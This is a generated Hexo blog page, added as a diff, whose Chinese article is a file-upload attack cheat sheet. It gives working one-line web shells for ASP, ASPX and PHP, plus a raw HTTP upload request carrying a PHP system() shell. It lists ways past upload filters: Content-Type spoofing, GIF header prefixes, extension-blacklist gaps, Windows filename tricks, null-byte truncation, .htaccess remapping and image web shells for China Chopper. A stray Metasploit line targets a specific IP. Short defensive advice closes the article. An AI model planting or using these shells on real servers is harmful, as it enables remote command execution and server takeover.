@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>文件上传 | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Hexo, Theme-AD">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 持续更新中</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/dongyuanxin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-01-01
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    文件上传
+  </h1>
+  
+  <article class="passage-article">
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">一句话木马</span><br><span class="line">asp的一句话是：</span><br><span class="line"></span><br><span class="line">&lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line"></span><br><span class="line">aspx的一句话是：</span><br><span class="line"></span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br><span class="line"></span><br><span class="line">php的一句话是：</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span><br><span class="line"></span><br><span class="line">前端检测</span><br><span class="line">     </span><br><span class="line">JavaScript验证的几种绕过方式：</span><br><span class="line">2.1 通过浏览器审查元素对网页的代码查看，找到对文件格式或大小的限制然后修改即可；</span><br><span class="line">2.2 通过Burpsuite工具对浏览器进行代理，抓包对包里的内容进行修改。</span><br><span class="line">2.3最简单粗暴的就是直接浏览器禁用JavaScript脚本</span><br><span class="line">后端验证</span><br><span class="line">set RHOST 114.115.175.102</span><br><span class="line">文件类型绕过</span><br><span class="line">　　我们可以通过抓包，将content-type字段改为image/gif</span><br><span class="line"></span><br><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">TE: deflate,gzip;q=0.3</span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/5.803</span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: 155</span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif (原为 Content-Type: text/plain)&lt;?php system($_GET[&apos;command&apos;]);?&gt;</span><br><span class="line">--xYzZY-</span><br><span class="line"></span><br><span class="line">文件头绕过</span><br><span class="line">　　在木马内容基础上再加了一些文件信息，有点像下面的结构</span><br><span class="line">GIF89a&lt;?php phpinfo(); ?&gt;</span><br><span class="line">文件后缀名绕过</span><br><span class="line">前提：黑名单校验</span><br><span class="line">黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</span><br><span class="line">绕过方法：</span><br><span class="line">（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</span><br><span class="line">（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</span><br><span class="line">能被解析的文件扩展名列表：</span><br><span class="line"></span><br><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line">php php php3 php4</span><br><span class="line">exe exee</span><br><span class="line"></span><br><span class="line">配合操作系统文件命令规则</span><br><span class="line">上传不符合windows文件命名规则的文件名</span><br><span class="line">　　test.asp.</span><br><span class="line">　　test.asp(空格)</span><br><span class="line">　　test.php:1.jpg</span><br><span class="line">　　test.php::$DATA</span><br><span class="line">　　shell.php::$DATA…….</span><br><span class="line"></span><br><span class="line">会被windows系统自动去掉不符合规则符号后面的内容。</span><br><span class="line"></span><br><span class="line">0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</span><br><span class="line"></span><br><span class="line">　　test.php(0x00).jpg</span><br><span class="line">　　test.php%00.jpg</span><br><span class="line">　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</span><br><span class="line"></span><br><span class="line">.htaccesss </span><br><span class="line">上传当前目录的.htaccess 文件</span><br><span class="line">例如内容为： AddType application/x-http-php .jpg   (上传的jpg 均以php执行)</span><br><span class="line">把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件</span><br><span class="line"></span><br><span class="line">POST/GET</span><br><span class="line">有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</span><br><span class="line">此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</span><br><span class="line"></span><br><span class="line">图片马</span><br><span class="line">指的是代码写入后不破坏一句话: &lt;?php @eval($_POST[1])?&gt;</span><br><span class="line">图片为前提,图片仍可正常打开。 </span><br><span class="line">用 010 Editor打开任意一张图片，将上述代码插入右边最底层或最上层后保存。</span><br><span class="line"></span><br><span class="line">或者使用CMD制作一句话木马。 参数/b指定以二进制格式复制、合并文件; </span><br><span class="line">用于图像类/声音类文件 参数/a指定以ASCII格式复制、合并文件。</span><br><span class="line">用于txt等文档类文件 copy 1.jpg/b+1.php 2.jpg //意思是将1.jpg以二进制与1.php合并成2.jpg 那么2.jpg就是图片木马了。</span><br><span class="line">上述两种上传到服务器后都可用菜刀连接。</span><br><span class="line">文件校验的几点建议</span><br><span class="line"></span><br><span class="line">文件扩展名服务端白名单校验。</span><br><span class="line">文件内容服务端校验。</span><br><span class="line">上传文件重命名。</span><br><span class="line">隐藏上传文件路径。</span><br><span class="line">使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件；</span><br><span class="line">单独设置文件服务器的域名；</span><br><span class="line"> 限制文件上传大小，防止上传文件中压缩有其他脚本文件，限制上传大小可以一定程度上防止，图片携带等等问题；</span><br><span class="line">对文件头进行加密处理，防止黑客读取文件头信息</span><br></pre></td></tr></table></figure>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2019/01/01/文件上传/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2019/01/01/弱点扫描/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/01/01/电子取证/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
